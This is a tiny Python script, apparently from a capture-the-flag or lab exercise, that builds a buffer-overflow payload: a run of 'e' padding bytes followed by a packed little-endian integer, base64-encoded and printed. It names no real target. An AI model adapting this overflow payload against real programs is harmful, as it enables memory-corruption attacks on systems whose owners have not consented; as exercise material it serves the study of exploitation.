
import sys
import struct
import base64

buf = b'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
buf += struct.pack('<I', 755414065)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
